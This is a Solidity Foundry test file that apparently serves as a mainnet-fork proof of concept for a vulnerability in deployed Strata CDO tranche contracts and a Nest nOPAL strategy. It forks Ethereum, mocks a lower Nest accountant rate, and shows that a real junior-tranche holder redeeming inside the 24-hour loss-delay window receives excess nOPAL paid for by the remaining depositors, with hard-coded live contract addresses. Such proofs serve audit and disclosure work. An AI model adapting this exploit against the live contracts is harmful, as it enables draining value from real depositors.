// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {Tranche} from "../../contracts/tranches/Tranche.sol";
import {StrataCDO} from "../../contracts/tranches/StrataCDO.sol";
import {DYSAccounting} from "../../contracts/tranches/DYSAccounting.sol";
import {NestOpalStrategy} from "../../contracts/tranches/strategies/nest/NestOpalStrategy.sol";
import {INestAccountant, IAprSnapshotProvider} from "../../contracts/tranches/strategies/nest/interfaces/INestContracts.sol";

/// @notice Mainnet-fork evidence that the deployed nOPAL market wires the exact vulnerable path.
/// @dev This test never broadcasts a transaction. It forks Ethereum locally, uses a real pre-existing
///      jrnOPAL holder, and models a legitimate lower Nest accountant state with Foundry mockCall.
///      The control and attack worlds execute against the deployed Strata CDO/JRT/strategy/accounting.
contract NestOpalDYSMainnetForkProof is Test {
    address constant NOPAL = 0x119Dd7dAFf816f29D7eE47596ae5E4bdC4299165;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant ACCOUNTANT = 0x2Ed2f77a961fc92F73D1087786099c39C894Ed1D;

    address constant CDO = 0xaE212D8515BA65C719f23dBad6bF73B74d4e4edE;
    address constant STRATEGY = 0x5aeCBb5719a9468CdCfa6673d1DDC1Cf72a5a4aA;
    address constant ACCOUNTING = 0xB6F3d2deF3058d4Faf07E7104DE2f69c638f2BF7;
    address constant JRT = 0x1b2b8cFEF0b7B1Fad216b55fefeEb0c3349Da141;
    address constant SRT = 0x8a646Edc4633ADBA5Ec87DedaF3Af958e268FE96;

    // Strata's initialization transaction minted jrnOPAL to this address on mainnet.
    address constant REAL_JRT_HOLDER = 0x4be3749a0F6557b8fd98F3967e859DbD7C694eF4;

    Tranche jrt = Tranche(JRT);
    Tranche srt = Tranche(SRT);
    StrataCDO cdo = StrataCDO(CDO);
    NestOpalStrategy strategy = NestOpalStrategy(STRATEGY);
    DYSAccounting accounting = DYSAccounting(ACCOUNTING);
    INestAccountant accountant = INestAccountant(ACCOUNTANT);

    struct Outcome {
        uint256 tokenOut;
        uint256 valueAtLossRate;
        uint256 remainingJrtNav;
        uint256 remainingSrtNav;
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    }

    function test_Fork_DeployedGraphAndConfigurationExist() public view {
        assertGt(CDO.code.length, 0, "CDO missing");
        assertGt(STRATEGY.code.length, 0, "strategy missing");
        assertGt(ACCOUNTING.code.length, 0, "accounting missing");
        assertGt(JRT.code.length, 0, "JRT missing");
        assertGt(SRT.code.length, 0, "SRT missing");
        assertGt(NOPAL.code.length, 0, "nOPAL missing");
        assertGt(ACCOUNTANT.code.length, 0, "Nest accountant missing");

        assertEq(address(cdo.strategy()), STRATEGY, "deployed CDO strategy mismatch");
        assertEq(address(cdo.accounting()), ACCOUNTING, "deployed CDO accounting mismatch");
        assertEq(address(cdo.jrtVault()), JRT, "deployed JRT mismatch");
        assertEq(address(cdo.srtVault()), SRT, "deployed SRT mismatch");
        assertTrue(cdo.isJrt(JRT), "deployed JRT not registered");
        assertEq(address(strategy.nOPAL()), NOPAL, "strategy nOPAL mismatch");
        assertEq(address(strategy.USDC()), USDC, "strategy USDC mismatch");
        assertEq(address(strategy.accountant()), ACCOUNTANT, "strategy accountant mismatch");
        assertGt(address(strategy.aprProvider()).code.length, 0, "APR provider missing");
        assertEq(jrt.asset(), USDC, "JRT accounting base must be USDC");
        assertEq(srt.asset(), USDC, "SRT accounting base must be USDC");

        uint256 holderBal = IERC20(JRT).balanceOf(REAL_JRT_HOLDER);
        assertGt(holderBal, 0, "real historical JRT holder no longer owns shares at fork head");
        console2.log("real holder jrnOPAL shares", holderBal);
        console2.log("live JRT NAV", jrt.totalAssets());
        console2.log("live SRT NAV", srt.totalAssets());
        console2.log("live strategy NAV", strategy.totalAssets());
    }

    function test_Fork_StaleAccountingAndLiveConversionUseDifferentRates() public {
        uint256 liveRate = accountant.getRateInQuoteSafe(USDC);
        assertGt(liveRate, 0, "live Nest rate missing");

        uint256 lossRate = Math.mulDiv(liveRate, 9_995, 10_000); // 5 bps lower
        _modelFreshNegativeAccountantState(liveRate, lossRate);

        uint256 nav0 = accounting.nav();
        uint256 anchor = accounting.lastReconciliation();
        uint256 raw = strategy.totalAssets();
        uint256 gated = strategy.totalAssets(nav0, anchor);

        assertLt(raw, nav0, "modeled lower rate must reduce realizable strategy NAV");
        assertEq(gated, nav0, "deployed strategy must hold the negative NAV stale inside 24h");

        uint256 probeBase = 100 * 1e6;
        uint256 liveTokens = strategy.convertToTokens(NOPAL, probeBase, Math.Rounding.Ceil);
        uint256 staleRateTokens = Math.mulDiv(probeBase, 1e6, liveRate, Math.Rounding.Ceil);
        assertGt(liveTokens, staleRateTokens, "lower live rate must increase nOPAL settlement quantity");

        console2.log("pre-loss live rate", liveRate);
        console2.log("modeled legitimate lower rate", lossRate);
        console2.log("stored DYS NAV", nav0);
        console2.log("lower realizable strategy NAV", raw);
        console2.log("gated accounting NAV", gated);
        console2.log("100 USDC tokens at old rate", staleRateTokens);
        console2.log("100 USDC tokens at lower live rate", liveTokens);
    }

    function test_Fork_RealHolderGetsMoreNopalInStaleWorldThanFreshControl() public {
        uint256 holderShares = IERC20(JRT).balanceOf(REAL_JRT_HOLDER);
        assertGt(holderShares, 0, "need real JRT holder");

        uint256 maxShares = jrt.maxRedeem(REAL_JRT_HOLDER);
        uint256 shares = Math.min(holderShares, maxShares);
        if (shares > holderShares / 2) shares = holderShares / 2;
        assertGt(shares, 0, "real holder has no redeemable JRT");

        uint256 liveRate = accountant.getRateInQuoteSafe(USDC);
        uint256 lossRate = Math.mulDiv(liveRate, 9_995, 10_000);
        _modelFreshNegativeAccountantState(liveRate, lossRate);

        uint256 nav0 = accounting.nav();
        uint256 anchor = accounting.lastReconciliation();
        assertLt(strategy.totalAssets(), nav0, "lower rate must create live downside");
        assertEq(strategy.totalAssets(nav0, anchor), nav0, "downside must remain stale for accounting");

        uint256 snap = vm.snapshot();

        vm.warp(anchor + 24 hours + 1);
        Outcome memory control = _redeemRealHolder(shares, lossRate);

        vm.revertTo(snap);
        Outcome memory attack = _redeemRealHolder(shares, lossRate);

        assertGt(attack.tokenOut, control.tokenOut, "stale world must pay more nOPAL");
        assertGt(attack.valueAtLossRate, control.valueAtLossRate, "stale world must transfer excess live value");

        uint256 attackerGain = attack.valueAtLossRate - control.valueAtLossRate;
        uint256 remainingCapitalLoss =
            (control.remainingJrtNav + control.remainingSrtNav) -
            (attack.remainingJrtNav + attack.remainingSrtNav);

        assertGt(attackerGain, 0, "attacker gain must be positive");
        assertApproxEqAbs(attackerGain, remainingCapitalLoss, 10, "gain must be funded by remaining Strata capital");

        console2.log("fork control nOPAL out", control.tokenOut);
        console2.log("fork stale nOPAL out", attack.tokenOut);
        console2.log("fork attacker excess USDC 6d", attackerGain);
        console2.log("fork remaining-capital incremental loss USDC 6d", remainingCapitalLoss);
    }

    function _redeemRealHolder(uint256 shares, uint256 lossRate) internal returns (Outcome memory out) {
        uint256 beforeBal = IERC20(NOPAL).balanceOf(REAL_JRT_HOLDER);
        vm.prank(REAL_JRT_HOLDER);
        uint256 tokenOut = jrt.redeem(NOPAL, shares, REAL_JRT_HOLDER, REAL_JRT_HOLDER);
        uint256 received = IERC20(NOPAL).balanceOf(REAL_JRT_HOLDER) - beforeBal;
        assertEq(received, tokenOut, "deployed path must physically settle nOPAL");

        out.tokenOut = tokenOut;
        out.valueAtLossRate = Math.mulDiv(tokenOut, lossRate, 1e6);
        out.remainingJrtNav = jrt.totalAssets();
        out.remainingSrtNav = srt.totalAssets();
    }

    function _modelFreshNegativeAccountantState(uint256 liveRate, uint256 lossRate) internal {
        INestAccountant.AccountantState memory state = accountant.accountantState();
        uint256 anchor = accounting.lastReconciliation();

        // Keep the modeled update strictly inside Strata's 24h loss-delay window.
        uint64 updateTs = uint64(anchor + 1 hours);
        if (block.timestamp <= updateTs) vm.warp(updateTs + 1);

        state.exchangeRate = uint96(lossRate);
        state.lastUpdateTimestamp = updateTs;
        state.isPaused = false;

        vm.mockCall(
            ACCOUNTANT,
            abi.encodeWithSelector(INestAccountant.getRateInQuoteSafe.selector, USDC),
            abi.encode(lossRate)
        );
        vm.mockCall(
            ACCOUNTANT,
            abi.encodeWithSelector(INestAccountant.accountantState.selector),
            abi.encode(state)
        );

        IAprSnapshotProvider provider = strategy.aprProvider();
        assertTrue(provider.isNegativeChange(uint96(lossRate)), "deployed provider must see lower rate as negative");
        if (!provider.isMeaningfulUpdate(uint96(lossRate), updateTs)) {
            vm.mockCall(
                address(provider),
                abi.encodeWithSelector(IAprSnapshotProvider.isMeaningfulUpdate.selector, uint96(lossRate), updateTs),
                abi.encode(true)
            );
        }
        vm.mockCall(
            address(provider),
            abi.encodeWithSelector(IAprSnapshotProvider.updateSnapshot.selector),
            abi.encode()
        );

        assertLt(lossRate, liveRate, "modeled rate must be a loss");
    }
}
